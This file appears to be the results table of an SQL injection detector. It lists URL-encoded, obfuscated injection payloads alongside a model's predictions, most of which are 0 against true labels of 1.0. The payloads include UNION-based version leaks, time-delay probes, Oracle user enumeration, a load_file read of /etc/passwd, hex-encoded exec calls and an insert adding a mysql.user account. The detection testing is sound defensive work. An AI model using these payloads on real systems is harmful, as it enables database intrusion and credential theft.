,Query,Prediction,Actual
83," %73e%6cec%74 *%20from%20us%65rs%20whe%72e  %69d%2b0%2b2%2a3%2d6%3d8%2d8%2b2%2a3-%36+S%49N(%30)%2b2%2a3-%36+1%20O%52 %53I%4e(%30)%20o%72 %32/%32-1 %6fR %53IN%280%29 O%72 %31#%20"". un%69o%6e %73e%6ce%63t %27a%27,ver%73i%6fn%20 %28    )%20 %20-%2d %31 ",0,1.0
84," %73e%6cect%20*%20f%72om us%65r%73 wher%65 %200%2b0+%32/%32-%31+%69d%3d0+2%2f2-%31+%31 O%52 %53IN%280%29 OR %31#%20""; u%6eio%6e se%6ce%63t %6eul%6c,%76ers%69o%6e  %28 %20  ) %20 --%201%20",0,1.0
85,"%20sel%65c%74 * %66rom%20users%20wh%65re %208-8%2b0%2bi%64=8-%38+0%2bS%49N%280)%2b1%2b2/2%2d1%2b2*%33-6 oR%208-8 %4fr%202*3%2d6 %4fr%202/%32-1 O%52 %31#%20""%3f %4fR%208%2d8%20o%52 8%2d8%20||  2%2a3%2d6%2b1%2b0+S%49N(%30)%2b2*3%2d6=%32*%33-6+%31+%32*3%2d6%20-%2d %31 ",0,1.0
86," %22a%20""%20"" O%72 %38-8%20o%52 %32*3-%36 O%52 %201+0%2b8-8%3d0%2bS%49N(%30)%2b2%2a3-6%2b1-%2d+%32*3%2d6%2b2%2f2%2d1 ""%20",0,1.0
87, %73e%6ce%63t * %66rom %75s%65rs w%68er%65  i%64+%32*%33-6+%38-%38+SIN(0)%3d0%2b2*3-%36+%31+%38-8%20*%31 un%69o%6e selec%74 1%2cb%61n%6ee%72 f%72om%20v%24ve%72s%69o%6e whe%72e  0%2b2%2f2%2d1%2bro%77n%75m+SIN%280)%2b2*%33-%36+SIN(0)=%30+2*3%2d6%2b1%2b0 %2d-%201 ,0,1.0
88," %41N%44 %31 %61N%64 1 A%4eD  8%2d8+%32*%33-6%2b1%2b2%2a3-%36+2%2f2%2d1%3d2%2f2-1+u%74l%5fi%6ead%64r.ge%74_hos%74_a%64d%72es%73+2*3-%36+%38-8+2*%33-6%2b2%2a3-6%20 %20(%20 %20 ( %20 %53E%4cEC%54 %44IS%54IN%43T%20 (  co%6cum%6e_n%61m%65 %20) %20 %46RO%4d %20 %28  SEL%45C%54 %44ISTI%4eC%54 %20(  %63olu%6dn_%6ea%6de  )  ,%20R%4fW%4eUM A%53 %4cIM%49T%20F%52O%4d a%6cl_ta%62_%63o%6cumn%73  )%20  %57HE%52E  8-8+%38-8+%4cIMI%54+%32*3%2d6+2/%32-1%3d4%2b2*%33-%36+%53I%4e(0)%2b2/%32-%31+2%2a3-%36 %20 )%20  %20)    %41ND%20 2*%33-%36+%30+%27i'=%38-8%2b'i%2b8%2d8%20",0,1.0
89," %73e%6cec%74 * %66r%6fm %75s%65rs %77he%72e%20 0+%32/%32-%31+i%64+2%2f2%2d1%3d2%2a3%2d6%2b2%2f2-%31+%271%27+%53IN%280) %75nio%6e se%6cec%74   %28  %5c  %29 %20,%40@%56E%52S%49O%4e -%2d 1' ",0,1.0
90,%31 AN%44 1%20a%4eD%20u%73er%5fn%61m%65 %20(  %20  %32/%32-1+%32*%33-6%2bS%49N%280)%2b8%2d8+)%2b8-8=2*%33-6%2b'd%62o'%2b8-8%20,0,1.0
91,"%3b if%20n%6ft%20 %28  %73ubst%72in%67  %20(   %20(   sel%65ct %40@%76e%72s%69o%6e  %29 %20,%324%2c1%20 )   %3c> %31  ) %20 w%61itfo%72 de%6ca%79 %270%3a0%3a2%27 -%2d ",0,1.0
92," s%65le%63t %2a %66ro%6d user%73 %77here %202%2a3-6%2b2/2-%31+%32/%32-1+%30+%69d=8-%38+%32*%33-%36+%53I%4e(%30)+1%20o%72 8%2d8%20or%208%2d8 %7c|%201%23 ""$%20un%69o%6e s%65l%65ct %31,v%65r%73io%6e %20( %20 %20)  %20-%2d %31 ",0,1.0
93, %73e%6ce%63t%20* %66r%6fm%20use%72s whe%72e%20 2/%32-%31+2%2a3%2d6%2bid%2b2/%32-1+%38-8%2bSI%4e(%30)=S%49N%280%29+%31+0%20or 2%2a3-%36 or%201# %22{ u%6eio%6e select%20nu%6cl%2cv%65r%73ion%20 %28 %20  )%20  %2d-%201 ,0,1.0
94,%73e%6ce%63t%20* %66r%6fm%20u%73e%72s where%20 2/2-1%2bi%64+%32*3-%36=%38-%38+%32/%32-1%2bSI%4e(%30)+'%31'%2b2%2a3-%36 *%24 %2e OR SI%4e(%30)%20Or%20 %31+0+%30=%32/%32-1%2bSIN(%30)+%31+%32*%33-6+%32/%32-1%20-%2d %31'%20,0,1.0
95,%73elect %2a %66r%6fm%20us%65rs%20where  0%2bS%49N%280)+%38-8%2bi%64+%32/2-1%3d1%2b0%2b2/%32-%31+2/2-%31 +$+.%20OR%202%2f2-%31 Or %30 %6fR %202%2f2-%31+%31+%30=%32/2%2d1+2*%33-6+2%2a3%2d6+1%2bSIN(%30) -- %31 ,0,1.0
96,sel%65ct %2a f%72o%6d us%65r%73 %77he%72e%20 2%2f2-%31+id+%32/%32-1+%30+8%2d8+%53IN%280)=%32*3%2d6%2b1+2%2f2-1%20or%202/%32-1%20O%72 %38-8%20Or%208-%38 %6fr%20 %20( %20\+ %20 %32/%32-%31+)%2b0+2%2f2%2d1%3d8-%38+1+%32/%32-1+%32/2%2d1%2b8-8%20o%72 %201%2bS%49N(0%29+S%49N(%30)+%38-%38=0%2b0%2b1%20-%2d %31 ,0,1.0
97,"%20AND%201%20an%64 %31 %41ND%20 2%2a3%2d6%2b1%2b0=%75tl%5fin%61d%64r.g%65t%5fhost_a%64dr%65s%73+S%49N%280%29+2%2a3-%36 %20 %28 %20  (   SE%4cEC%54 %44I%53TINCT %20(%20 %55S%45R%4eAME%20 %29  %20FROM%20 %20( %20S%45L%45CT DI%53TINCT%20 ( %20USE%52N%41ME  %29 %20,%20ROWN%55M A%53 %4cI%4dI%54 FRO%4d SYS.AL%4c_%55S%45RS %20)   %57H%45RE%20 %53I%4e(0)+LI%4dI%54+8-8+8-%38+%53I%4e(0)%3d8%2d8%2b8%2d8%2b6%2b0%2b2%2f2%2d1   )%20   %29 %20 %20AN%44 %202%2f2-1+%27i'+%53I%4e(%30)%3d'i%2bS%49N%280)+2%2f2%2d1 ",0,1.0
98,%6fr  0+%31+%53I%4e(%30)%2b2%2f2%2d1%3dS%49N(0)%2b1+%32*%33-6%20Or 8-%38 %4fR %20SI%4e(0)%2b'%27+%32/2-1+%32*3%2d6%2b2%2f2%2d1%2b8-8%3d2%2f2-1+%27+8-8+%32/%32-1+%32/%32-1%20,0,1.0
99,%73ele%63t %2a %66rom%20u%73ers wh%65re  %32*3-6+%32/%32-%31+2*%33-%36+%30+id%3d1+8-8+%38-8%20  o%72 %32*%33-6%20Or%20 %32/%32-1%2b1+%38-%38+%32*3%2d6%2b2%2a3-6%3d1%2b2*3%2d6+%32*3%2d6%2b2%2a3%2d6 -%2d 1%20,0,1.0
100,or 'te%78t%27 >%20'%74' ,0,1.0
101,"12%334 %20"" AN%44 %31 AND %202%2a3%2d6%2b1+%30=%38-8+%30+8%2d8%2b0%20U%4eION %41L%4c %53ELEC%54  %22ad%6din %22,%20 %2281%64c%39bdb%352%6404d%632%300%336%64b%648313%65d055 ",0,1.0
102,"%20sel%65c%74 * f%72om%20us%65rs %77h%65r%65  2*3-%36+%32*%33-%36+i%64=%32/2%2d1%2b0%2b1%2b2%2f2%2d1%2b0%2b8%2d8%20or %32*%33-%36 %4fr%208-%38 or %20""%25[%20""%20or 2/2%2d1%20Or 2%2a3%2d6 %7c|%208%2d8 OR%20 2*3%2d6+1+8%2d8+%53IN(0)%2b2%2a3-6=%53IN%280)%2bS%49N(%30)%2b1%2b8-8+2%2a3-6 %2d- 1%20",0,1.0
103," s%65l%65c%74 *%20fro%6d use%72s%20whe%72e  %32/%32-1+2%2a3-%36+i%64+%32/%32-1%3d2%2f2%2d1+S%49N(0)+%38-8%2b1%2b8-8 %4fr%202*3%2d6 %6fr S%49N(0) %4fR%201# "" %30+8-%38+%3b+%38-%38+8%2d8%3d2*%33-%36+%53IN%280%29+8%2d8+%53IN%280)%2b1%20u%6eion %73e%6ce%63t %31,ve%72s%69o%6e %20( %20 %20)   %2d-%201%20",0,1.0
104,a%64m%69n' or%200 o%52 %53IN%280%29 O%52 %30 %4fr  %32/2-%31+%271%27+%32*3%2d6%2b2/%32-1%2b0%2b0%3dSIN(0%29+SI%4e(0)+'%31'%2b2/2%2d1 %23,0,1.0
105,se%6cect *%20fro%6d %75s%65r%73 %77he%72e  2%2f2%2d1+i%64+%30+%38-8%3d2%2f2-%31+%32*%33-%36+%31+%32/%32-1 +%24 1%20or 8%2d8%20or%20 0%2b1%2b0%2b2%2a3-6%2b8-%38=2/2%2d1%2b2*%33-%36+%31 -- 1%20,0,1.0
106,s%20,0,1.0
107," %61Nd%201 aNd%201%20AN%44 1 %61N%64  %53IN%280%29+1%2bSI%4e(0)+2%2a3-%36=2*%33-6+8%2d8%2b2%2f2%2d1+ut%6c_%69n%61dd%72.%67et_%68o%73t_%61d%64res%73+%30+2%2f2%2d1 %20 %28  %20 %28 %20 S%45L%45CT%20D%49ST%49N%43T  (  U%53E%52N%41M%45 %20)  %20FR%4fM%20  (%20 %53E%4cEC%54 D%49STIN%43T  %28 %20U%53ER%4eAM%45 %20) %20,%20RO%57N%55M%20A%53 LI%4dI%54 %46ROM %53Y%53.AL%4c_%55S%45RS%20 )%20  %57HER%45 %20L%49M%49T+%53I%4e(%30)+%38-8%3d2/%32-%31+S%49N(%30)+%34 %20 )%20 %20 )%20  %20A%4eD %20SI%4e(0%29+2/%32-%31+'i'+%32/2-1=8%2d8+%27i%2b0+S%49N%280)%20",0,1.0
108,%20s%65le%63t%20* f%72o%6d i%6ef%6frmat%69on_s%63he%6da%2et%61b%6ce%73-- ,0,1.0
109," %73e%6ce%63t %2a %66r%6fm %75s%65rs%20w%68ere  %30+id%2bSIN(%30)%2b0=%30+%32*%33-%36+%53I%4e(0%29+%32/%32-1+%31 %4fR 2%2f2-%31 o%72 %30 %4fr%20 %22$&%20""%20||%202%2f2-1 o%52 %30 Or%20 8-8+1%2b8%2d8%2b2/2%2d1=2*3-%36+1+2/%32-%31+SIN%280%29+%53IN(0) -%2d %31 ",0,1.0
110,%31  %20)   %20)%20 %20 %4fr%202%2a3-%36 |%7c %53IN%280)%20|%7c p%67_%73l%65e%70  ( %20__%54IM%45__  ) %20-%2d ,0,1.0
111,%20se%6ce%63t %2a f%72o%6d users%20wh%65re  2%2f2%2d1+2/%32-1%2b8%2d8+%38-8%2bi%64=0+'1'%2b2/%32-%31+%32/%32-%31+0 uni%6fn %73e%6cect %21<@%2cv%65r%73i%6fn%20 %28  %20 )  %20--%201' ,0,1.0
112,d%65clar%65 %40q%20n%76arc%68ar   %28 %202%300 %20)%20 %20s%65lect  @%71+%32/2-%31+%32*3%2d6+%30=0+2%2f2-1%2b2/%32-1%2b2*%33-6+2/%32-%31+%30x%3770%306%31 %2e.%2e ,0,1.0
113, %4fR%202*3%2d6%20or %30 %4fR %20S%49N%280%29+%32/2%2d1+1%2bS%49N%280%29+%30+%30=%30+%53I%4e(0)%2b1+%30+%32*%33-%36+%32/2%2d1%20o%72 %200%2bS%49N(%30)+'%27+%30=2%2f2%2d1%2b2%2f2%2d1%2b'%2b0 ,0,1.0
114,%73e%6cect%20*%20fro%6d u%73e%72s%20wher%65  %32/2-%31+%69d%2b0%2b0+8%2d8=%53IN(%30)+1+%53I%4e(0%29 %25!%3c1 |%7c 2%2a3%2d6 %6fR %32*3%2d6 %4fR%20 %32*%33-6+%38-%38+%31+%38-8+%38-8%3d0+%31+%32/%32-%31 %2d-%201 ,0,1.0
115,de%63lar%65 @%71 %6evar%63h%61r%20 %20(%20 2%300%20 %29 %20 se%6ce%63t%20 %53I%4e(0)+2*3-%36+%38-8+%53I%4e(0)+%40q=%30+%32/2-%31+0%78770%306%310%3069%300%37400%366%3006F007200%320%300%3640%306%3500%36C0%306%310%307%3900%320%300%327%300%330%300%33A0%30300%303%41003%3100%330%3002%370000%2b2%2a3%2d6+%53I%4e(%30)+%32/%32-1 %65xe%63 %20( %20@%71  %29  ,0,1.0
116," s%65l%65c%74 * %66r%6fm u%73er%73 %77here%20 %30+S%49N(%30)+%69d+%32*3-%36=%38-%38+%31+%32/2%2d1+SI%4e(%30)%20o%72 8-%38 %4fR %20""%5d1%20""%20Or%202%2a3-%36 OR SI%4e(%30) o%52  %30+S%49N(0)%2b1%3d2%2a3-%36+%31+%32/2%2d1%20-- %31 ",0,1.0
117,%20se%6cec%74 %2a fro%6d %75s%65rs%20w%68e%72e%20 2*3%2d6%2b2%2a3-%36+8-%38+i%64+%38-%38+2%2f2-%31=%32/%32-%31+%53IN(0)+2%2f2%2d1%2b0+1%2b8%2d8 Or %30 o%72 %30 o%52 $+%3c1 u%6eio%6e s%65le%63t%201%2c@%40V%45R%53I%4fN %2d- %31 ,0,1.0
118,or%20 %53I%4e(0)+2/%32-1%2b'un%75s%75a%6c'%2b2%2f2-1+%32*%33-%36+%38-%38='%75nusu%61l%27+%32*%33-%36+0+8%2d8%2bSIN%280%29 ,0,1.0
119, O%52 %30 %7c| 2/%32-%31 %7c|%202*%33-6 %6fr 1 %69n%20 %20( %20s%65l%65ct @%40v%65r%73i%6fn%20 %29  %2d- ,0,1.0
120,%74ru%6ecat%65 ,1,1.0
121,%61s ,0,1.0
122,%20O%72 2/2%2d1%20O%52 0%20O%72 8%2d8%20oR %200%2b2/%32-1+3+%32*3%2d6%2bS%49N(%30)=%53I%4e(%30)%2b3%2bSIN%280%29+SI%4e(%30)+%53I%4e(0%29+%32*3-6%20--%20,0,1.0
123, se%6cec%74 * fr%6fm%20us%65r%73 whe%72e%20 %30+%32*%33-6+i%64+%32/2%2d1=2%2f2%2d1%2b8%2d8+%31 |%7c1%20u%6eion%20se%6cect%201%2cb%61n%6ee%72 %66rom v$v%65rs%69on %77h%65r%65 %208%2d8+0+row%6eu%6d+2%2a3%2d6+2/2%2d1%3d0%2b0+%31+%30+S%49N%280)+2/%32-1%20--%201 ,0,1.0
124,%20selec%74 %2a fro%6d %75se%72s%20w%68ere  %53IN(%30)+i%64+%30+%32/2%2d1%3d1+%38-%38+2%2a3%2d6+%32*%33-6%2b8%2d8%20<%40$$ un%69on sele%63t 1%2cver%73ion%20 %28 %20  )  %20-%2d %31 ,0,1.0
125,"ad%6di%6e "" %20) %20 %4fR %32/2%2d1%20Or%202%2f2-1%20Or%20  %28 %20 %221%20""%20SI%4e(%30)++%30=S%49N(%30)%2bS%49N%280%29+%2bSI%4e(0)%20""1%20",0,1.0
126,"%20se%6cect%20* fr%6fm%20us%65r%73 wh%65re  S%49N(0%29+id+0+%38-8+0%3d2%2f2-1%2b2%2a3%2d6%2b0+0+1+%53IN%280%29 %6fr%20S%49N%280)%20OR%201%23 %22@ u%6eio%6e sel%65ct%20'a%27,vers%69o%6e %20(  %20 %29  %20-%2d %31 ",0,1.0
127,"1  %29 %20 OR%202/2%2d1%20O%72 S%49N%280%29 %7c| be%6ec%68mar%6b %20(%20 %310%300000%30,%4dD%35 %20(  %31 %20 %29 %20 %20)%20  %23 ",0,1.0
128,%20s%65lect%20*%20f%72om us%65r%73 wh%65r%65  2%2a3-%36+8-8+id%2bS%49N(%30)=%32/%32-1+%31+%32*3-%36 %75n%69on %73el%65ct .1_%2cv%65rsi%6fn%20 (%20 %20 %29   -- 1%20,0,1.0
129, AND%201%20aN%64 %31 %61N%44 %31 A%4eD%201 %41N%44 1%20An%64  %30+1%2b8%2d8+8-%38+%30+8%2d8%3d8-%38+%38-%38+%75tl_%69n%61d%64r.%67et%5fho%73t_%61dd%72e%73s%2b8-8  %20(%20  %20(%20 %20S%45LECT %53YS.%44AT%41BA%53E%5fNAME FR%4fM %44UAL%20 %20) %20  ) %20 %20AND%20 %38-%38+%38-%38+'i%27+%38-8%3d2%2a3%2d6+%27i+S%49N(%30)%2b2/2-%31+%32/%32-1+SIN(%30)%20,0,1.0
130,"%20OR%202%2a3-%36 %6fR%202/2-%31 |%7c %53I%4e(0%29 %4fR%20 S%49N(0)+8-8%2bS%49N%280)%2b2*3-6+%30+%32*%33-%36=%32/%32-1%2b0+%38-8 %23 ""%20",0,1.0
131,%73e%6ce%63t%20*%20fr%6fm %75se%72s wh%65re %20id%2b2*3-%36+%53I%4e(0%29+%38-%38=0%2bSI%4e(0)%2b1+%53IN%280%29+%32*3-%36 %25$ %31 O%72 %30 o%72 2*%33-6%20or %201+S%49N%280%29+%53I%4e(0)%2b8-%38+2%2f2%2d1+%30=1%2b2%2f2-%31+%32*%33-%36 %2d-%201 ,0,1.0
132,%73el%65c%74 %2a %66rom%20us%65r%73 %77h%65r%65  %32/2-1+%32/%32-%31+%69d%2b8%2d8+8-%38=0+%31+2*3-6+2/%32-1%20%%21<%40 %4fr 2%2a3%2d6%20O%72  SIN(0)+%32*%33-6%2b1+2/2-%31+2%2f2%2d1%2b0=%38-8%2b2*%33-%36+1 -- %31 ,0,1.0
133,"; i%66 %6eot%20 (%20 s%75bstri%6eg%20 %20(%20 %20 %28 %20 %73e%6cect %40@%76er%73ion%20 ) %20,%325%2c1%20 )%20 %20<> %30 %20)%20  %77ait%66o%72 %64e%6cay '%30:0:%32' -%2d ",0,1.0
134,1 %20) %20 o%72 S%49N(0) %4fR %32/2%2d1%20O%72 %73lee%70  %28 %20_%5fTI%4dE%5f_ %20)%20 #%20,0,1.0
135," sel%65ct * fro%6d u%73e%72s%20wh%65re%20 %32/2-%31+2*%33-%36+id+%38-%38=S%49N%280%29+1%2bS%49N(%30)%2b2*3-%36 O%52 S%49N%280)%20Or  %221_%20""%20Or S%49N%280)%20OR %38-%38 %7c|%20 %53IN(%30)+%31+%32/2%2d1%2b2%2a3-%36+%38-%38=%38-%38+1%2bSIN(0) %2d- %31 ",0,1.0
136," %73elec%74 %2a %66rom u%73ers%20w%68e%72e%20 %38-%38+8-8+i%64+%38-8+2/2%2d1%2bS%49N(%30)=%53IN%280%29+1+%38-%38+0%2b2%2a3%2d6 <%31#%23 %75ni%6fn s%65l%65ct%201,%76e%72s%69on  ( %20  %29 %20 %2d-%201 ",0,1.0
137,%20s%65l%65ct %2a %66r%6fm%20u%73ers w%68e%72e  8%2d8%2b0%2bid+%38-8+0+0=%32*3%2d6%2b2%2f2-%31+1%20+ $%2b*%5c un%69o%6e sele%63t%20n%75ll%2c@@VERSIO%4e -- 1%20,0,1.0
138,%73ele%63t %2a f%72o%6d %75ser%73 %77he%72e %200+%69d%2b2%2a3-%36+2*3-%36=%32*3%2d6%2b2/%32-1+%53IN(%30)%2b0+1. %3c@%20O%72 %32/2-1 %4fR 2%2f2%2d1 %4fR  %31+%32*3%2d6+SI%4e(0)%3d2/2%2d1%2b1%2b0 %2d- %31 ,0,1.0
139,%20O%52 8-8 or%20t%72u%65--%20,0,1.0
140,;%20e%78e%63ute%20imme%64iate%20'%73e%6c'%20oR %32/%32-%31 Or %27ec%74 us'%20|%7c '%65r'%20,0,1.0
141,h%69' %4fR %53I%4e(0%29 O%52 8-%38 O%72 %202%2a3-6%2b'x%27+0+8%2d8%3d2/%32-1+S%49N%280%29+S%49N(0%29+%27x';%2b8-8+2*3-%36 ,0,1.0
142,s%65l%65ct%20* %66r%6fm %75s%65rs%20where%20 %30+%32*3-%36+%53IN(%30)%2bi%64+%32/2%2d1%2bSI%4e(%30)%3d2%2f2%2d1+2%2a3-%36+1 %3c@ %4fR %38-%38 %6fr 0%20oR%20 %32*3-%36+%38-8%2b0%2b1+S%49N%280%29+%32*3%2d6%3d2/%32-%31+2*3%2d6%2b8-%38+1 -%2d 1%20,0,1.0
143,"%20s%65le%63t *%20fr%6fm %75sers w%68e%72e  id+8%2d8+%32/%32-1+0%3dSIN(0)%2b8%2d8%2b1%2b2*3-6+2%2f2-1%2b2%2f2-%31 %4fR%202%2f2%2d1 || %32/2-1 %4fR%202%2f2-%31 %4fr %20"".%2c "" %6fr%208%2d8%20OR%20 1%2b2%2f2%2d1%2bSIN(%30)%3d1%2bSIN(%30)+2*%33-%36+2%2f2-%31+%30 -%2d %31 ",0,1.0
144,ad%6di%6e'%20# ,0,1.0
145," %73e%6ce%63t%20* f%72om%20u%73er%73 w%68e%72e%20 %38-8+2%2f2%2d1%2b2%2a3-%36+2%2a3-6+%69d=%38-%38+2*%33-6+1 %3c@%24_ u%6eion sel%65c%74 %31,v%65rsi%6fn%20 %28 %20 %20)%20  -- %31 ",0,1.0
146,"%20se%6cect * %66r%6fm %75s%65rs wh%65r%65  8-8+2*3-6%2b0+id%2b2/%32-1%3d8%2d8%2b1+%32*%33-6+0%20O%52 %38-8 O%52  %22,%20 (%20 %20""%20o%72 0%20Or%202/2%2d1%20or%20 %30+8-8%2b1+2*3-6+%32/%32-%31=2*%33-%36+1+%30+2/2%2d1+2/%32-1 %2d- 1%20",0,1.0
147," select%20* fro%6d u%73ers w%68er%65  %30+8-%38+id+8-8+%38-8%3d0%2b1+0%2bSI%4e(%30)%2b0%20Or 2%2f2%2d1%20oR%208%2d8%20O%52 %20"",{%20"" OR 2%2f2-1 O%72 2/2-%31 %6fR %30 %7c|%20 %31+%53IN(0%29+SIN(%30)%3d2%2a3-%36+%31+%32*%33-6 -%2d %31 ",0,1.0
148," unio%6e s%65l%65c%74 %31,%6coad%5ffile%20 (%20 %27/e%74c/p%61s%73w%64' %20)  ,1%2c1,1%3b ",0,1.0
149,"%20""%20 %29  %3bw%61it%66or%20del%61y%20'0%3a0%3a__T%49M%45_%5f'-%2d ",0,1.0
150, %4fr%208-%38 OR %38-%38 %4fr  %27u%6eu%73ua%6c'+8%2d8+%53I%4e(0)=%27un%75s%75a%6c'+8%2d8%2b0 ,0,1.0
151,"inser%74 i%6et%6f m%79s%71l.u%73er%20  %28 %20us%65r%2c %68o%73t, pa%73s%77o%72d%20 %29   %76a%6cu%65s%20 %20( %20'%6ea%6de%27,%20'%6co%63al%68ost%27,%20pa%73sw%6frd%20 ( %20'pa%73s%3123%27   %29 %20  %29 %20  ",0,1.0
152,"a%64mi%6e "" %4fR %32/2-1%20O%52 %20""1%20""%202%2f2-%31+%32*3%2d6%2b+S%49N%280)%2b8%2d8=2*%33-%36+%30+%20""1%20""/* ",0,1.0
153," s%65lec%74 %2a fr%6fm%20us%65r%73 %77her%65 %202%2a3%2d6+%32*3%2d6+i%64+%32*3-6%3d1%2b2%2f2-1%2b0+%32*3-%36+2*%33-6%20O%72 0 O%72 %20""1 %20(%20  ""%202%2a3-6%2b2%2f2%2d1%2b+0%3d8%2d8+1+%38-%38 %6fr%202/%32-1%20or%20 %30+%31+2%2f2-1%3d8-%38+%31+%38-8%20-- 1%20",0,1.0
154,"%20se%6ce%63t%20*%20f%72o%6d %75se%72s %77here%20 2*3-6+%30+%69d%2b0%2bS%49N(%30)%2b2%2a3%2d6%3d8-%38+8-8%2b2*3-%36+%31+%32/%32-1 %6fr 8-%38 o%72 %5c<%31 %75n%69on%20se%6cec%74 1,%40@V%45R%53IO%4e %2d-%201 ",0,1.0
155,%6cike ,0,1.0
156,or%20u%73ern%61m%65 like %63h%61r%20 (%20 %337  %29 %20;%20,0,1.0
157,%20)   %20) %20  %4fr 8%2d8 o%52 2*%33-%36 %6fR%20pg%5fs%6ce%65p%20 %28  %5f_TIME%5f_%20 ) %20-- ,0,1.0
158,s%65le%63t *%20f%72om user%73 %77her%65  %38-8+%30+id+8-%38+%32*3%2d6%3d2/2-1%2b1+2%2a3%2d6+8%2d8%20|%7c 2/2-1%20or %30 or $%2b<%5c %6fr%20 %32*3%2d6%2b0+%53IN(0)+%31+%32*3%2d6+0=%30+%32*%33-%36+%32*%33-6%2b1 %2d-%201%20,0,1.0
159,%6fr%20 %30+%53I%4e(%30)+%38-8+%33+2*%33-6%3d0%2bSIN%280%29+%33+%30+%32/%32-1 ,0,1.0
160," sel%65c%74 %2a from%20u%73er%73 whe%72e%20 0+2/%32-%31+%69d%2b0+%53IN%280)=S%49N(%30)%2b2/%32-%31+%53IN%280%29+1+0%20Or 0%20Or%20 "" %20( %20.%20"" oR%208-%38 %6fR %32/%32-%31 OR %32/2%2d1%20Or %201+2%2a3-6%2b0%3d8%2d8%2b1+2%2f2%2d1%2b2/%32-%31 -%2d %31 ",0,1.0
161,s%65le%63t * %66ro%6d u%73ers%20w%68e%72e%20 %30+0+%30+%69d+SIN(0%29=S%49N(%30)%2b0+%38-%38+1 %4fR%20S%49N(%30)%20Or %20 %28  %24+%20  S%49N(%30)+)%2b2/%32-1%2b8%2d8%2bS%49N%280%29+8-%38=%32/2%2d1%2b0%2b1+%30+8-%38+%53I%4e(%30) %6fr%20 %30+1%2b2%2f2%2d1=%32/2%2d1%2b8-8%2b1+%30 %2d- %31 ,0,1.0
162,%65xe%63 s%70 ,0,1.0
163, s%65le%63t %2a %66ro%6d us%65r%73 %77h%65r%65 %202%2f2-%31+2/%32-1%2b2%2a3-6%2b0+id%3d2/2%2d1+%32*3%2d6+1+SIN(%30)+2%2a3%2d6+%53IN(0) OR%208%2d8%20o%52 0%20oR 2%2f2-1%20|| \%2b<%24 u%6ei%6fn %73elect%201%2c@@V%45R%53I%4fN%20-- 1%20,0,1.0
164,s%65lect *%20fro%6d u%73ers%20w%68e%72e  %30+%69d%2bS%49N%280)+2%2f2-%31+%38-%38=0+%31+%32/%32-1 %6fr%200%20o%72 %32/2-%31 oR%20\%3c$ or%20 %53IN%280%29+%30+%31+%32*%33-6+%38-8=%30+0%2b2/2%2d1+%32*%33-6+%31 %2d-%201%20,0,1.0
165,"%20sel%65ct%20* f%72o%6d %75ser%73 w%68e%72e  %32*3-%36+2%2f2%2d1+%69d+2/%32-%31+8%2d8%3d2%2a3%2d6+%30+%38-8%2b1%2e&%261%20un%69o%6e se%6ce%63t %31,v%65r%73i%6fn%20 %28  %20 %29 %20 -%2d 1%20",0,1.0
166,%61d%6din'%20or%208%2d8%20Or%20 SI%4e(0)%2b1+%32/%32-1%3d2*3%2d6+%32*%33-%36+%53IN%280%29+1/%2a+%53IN(%30)%20,0,1.0
167,%61'%20w%61itf%6fr%20dela%79 '%30:%30:%310'-- ,0,1.0
168,"%20s%65l%65c%74 * f%72om %75s%65rs %77h%65r%65 %202*%33-%36+id%2b0=S%49N(0%29+1+%53I%4e(%30)%2bS%49N%280%29 +%20 %28 %20\  %29   %75n%69on%20sele%63t%20nu%6cl,@@%56ERS%49ON%20--%201%20",0,1.0
169,%20se%6cect%20*%20from %75sers %77h%65re%20 8%2d8+%53I%4e(%30)%2bid+8%2d8+S%49N(%30)%3d8-%38+%32*%33-6+1%2b8-%38+8%2d8 u%6eio%6e sel%65c%74 .1$_%2cv%65rsio%6e  %28 %20 %20)  %20--%201 ,0,1.0
170,%61nd%201 in%20  %28  s%65l%65c%74 %76ar f%72o%6d %74emp  %29  %2d-%20,0,1.0
171,%68i'%20 %29   O%52 0 O%72 %20 (%20 %202%2f2%2d1+%30+%27a%27+%53IN(%30)+SIN%280)=2*%33-6+%27a+%32*%33-6%20,0,1.0
